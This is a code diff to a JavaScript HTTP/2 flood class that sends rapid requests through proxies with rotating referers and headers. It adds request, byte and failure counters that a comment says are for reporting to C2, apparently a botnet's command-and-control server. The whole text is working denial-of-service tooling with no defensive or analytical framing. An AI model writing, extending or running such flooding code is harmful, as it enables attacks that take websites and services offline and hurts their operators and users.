@@ -19,6 +19,15 @@ export class HTTP2Flood {
         this.referers = referers;
         this.proxies = proxies;
         this.active = true;
+        
+        // Stats tracking for C2
+        this.stats = {
+            totalRequests: 0,
+            successfulRequests: 0,
+            failedRequests: 0,
+            totalBytes: 0,
+            totalPackets: 0
+        };
     }
 
     async start() {
@@ -77,19 +86,29 @@ export class HTTP2Flood {
 
                 try {
                     const req = client.request(this.generateHeaders());
+                    this.stats.totalRequests++;
 
                     req.on('response', () => {
                         REQUESTS_SENT.add(1);
+                        this.stats.successfulRequests++;
+                        this.stats.totalPackets++;
                     });
 
-                    req.on('data', () => {});
+                    req.on('data', (chunk) => {
+                        this.stats.totalBytes += chunk.length;
+                    });
+                    
                     req.on('end', () => {});
-                    req.on('error', () => {});
+                    
+                    req.on('error', () => {
+                        this.stats.failedRequests++;
+                    });
 
                     req.end();
                     BYTES_SENT.add(200); // Approximate header size
+                    this.stats.totalBytes += 200;
                 } catch (e) {
-                    // Silent fail
+                    this.stats.failedRequests++;
                 }
             };
 
